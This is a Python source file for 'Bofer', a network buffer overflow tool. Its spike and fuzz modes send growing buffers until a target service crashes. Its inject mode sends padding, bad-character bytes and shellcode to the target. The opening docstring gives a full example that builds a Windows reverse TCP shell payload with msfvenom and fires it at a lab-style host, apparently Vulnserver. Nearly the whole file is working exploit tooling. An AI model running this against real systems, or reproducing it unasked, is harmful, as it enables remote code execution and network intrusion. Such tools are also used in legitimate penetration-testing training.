#!/usr/bin/env python

# Bofer - tool for performing Buffer Overflow test on Network exposed applications.
#
# JONNYZAR. Copyright (C) 2022 https://github.com/jonnyzar. All rights reserved.
#
# This software is provided under MIT LICENCE.
#
# Description:
#   Easy to use out of the box tool to look for buffer overflow entry points and inject shellcode into them.
#
# Author:
#   Yan Zaripov (@jonnyzar)
#


'''
Bug> Blank Register Window
Press Alt + C to get it back. 

You can do this by going to View -> CPU. 

EXAMPLE usage of Shell code injection

offset=2003

vulnerable_address="ABCCDDEE" #pay attention to Endianess - reverse the address value if its little endian

NOP=$(python3 -c "print('90'*16)") 

shell_code=$(msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.1 LPORT=1337 -a x64 --platform windows -f hex)

payload=$vulnerable_address$NOP$shell_code 

python3 bofer.py -x 'TRUN /.:/' -n $offset -c $payload inject 192.168.56.6 9999


'''


from operator import mod
import sys
import socket
from time import sleep
import argparse

# bad characters needed for testing
BadChars = (b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
            b"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
            b"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
            b"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
            b"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
            b"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
            b"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
            b"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
            b"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
            b"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
            b"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
            b"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
            b"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
            b"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
            b"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
            b"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
            )


def test_connection(target_ip, target_port):
    # test connection to host
    try:
        k = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        k.settimeout(10)
        k.connect((target_ip, target_port))
        k.settimeout(None)
    except Exception as e:
        print(e)
        sys.exit(1)

    k.close()


def spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix):
    # spike and fuzz modes

    # standard step size for fuzz
    package = b'A'*step
    #package = 'A'*step
    timeout = 5


    if mode == 'spike':
        mult = 1000
    else:
        mult = 1

    # the smaller the step, the higher is accuracy
    payload = prefix + prefill

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                
                s.settimeout(timeout)
                s.connect((target_ip, target_port))

                # send information as bytes
                s.sendall(payload + postfix)
                #s.send(bytes(buffer, "latin-1"))

                sleep(1)
                payload = payload + package * mult
                print("Payload size sent = %d" % (len(payload) - len(prefix)))

        except KeyboardInterrupt:
            print("Operation aborted. Exiting...")
            sys.exit()

        except:
            print("Overflow at around %d bytes." %(len(payload) - len(prefix)))
            sys.exit(1)


def inject_mode(target_ip, target_port, BadChars, prefix, prefill, shellcode, useBadChars, postfix):

    timeout = 5

    if not useBadChars:
        BadChars = bytearray("", encoding='ascii')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((target_ip, target_port))

    payload = prefix + prefill + BadChars + shellcode + postfix

    s.sendall(payload)

    print(f"Injected {len(payload)} bytes to {target_ip}:{target_port}")

    s.close()


def main():

    parser = argparse.ArgumentParser()

# modes: spike, fuzz, inject
# spike: find vulnerable entry points
# fuzz: increase buffer gradually with smaller steps to identify BoF location
# inject: inject payload

    parser.add_argument('bofMode', type=str,
                        help='Enter BoF mode: spike, fuzz, inject')
    parser.add_argument('targetIP', type=str,
                        help='ip address of the target host')
    parser.add_argument('targetPort', type=int,
                        help='port number of the target host')
    parser.add_argument('-s', '--step', default=100, type=int,
                        help='Step is amount of bytes to use in Fuzzying mode')
    parser.add_argument('-x', '--prefix', default='', type=str,
                        help='prefix can be used at the beginning of each TCP frame to make correct requests')
    parser.add_argument('-p', '--postfix', default='', type=str,
                        help='provide as HEX value. postfix may be needed to send the payload. It is prepended at the end')
    parser.add_argument('-n', '--prefill_num', default=0, type=int,
                        help='Prefill the payload with n bytes after prefix')
    # Prefill with ascii pattern to find exact offset or insert non byte values
    parser.add_argument('-a', '--prefill_pattern', default='', type=str,
                        help='Prefill the payload with specific hex symbols')
    parser.add_argument('-b', '--useBadChars', default=0, type=int,
                        help="1: bad character placement; 0: no bad characters")
    parser.add_argument('-c', '--ShellCode', default='',
                        type=str, help="Input as is. Example: \"AA BB CC\"")

    # parse inputs
    args = parser.parse_args()

    #mode in use
    mode = args.bofMode

    target_ip = args.targetIP
    target_port = args.targetPort
    step = args.step
    prefix = bytearray(args.prefix, encoding='ascii')
    postfix = bytearray.fromhex(args.postfix)
    prefill_num = args.prefill_num
    prefill_pattern = bytearray(args.prefill_pattern, encoding='ascii')
    useBadChars = args.useBadChars
    shellcode = bytearray.fromhex(args.ShellCode)

    prefill = b'A' * prefill_num + prefill_pattern

    if mode == "spike" or mode == "fuzz":

        #test_connection(target_ip, target_port)
        spike_fuzz_mode(target_ip, target_port, mode, prefix, prefill, step, postfix)

    elif mode == "inject":

        #test_connection(target_ip, target_port)
        inject_mode(target_ip, target_port, BadChars,
                    prefix, prefill, shellcode, useBadChars, postfix)

    else:
        print(f"Uknown mode: {mode} ... exiting")
        print("Try entering: spike, fuzz, inject")
        sys.exit(1)


if __name__ == "__main__":
    main()
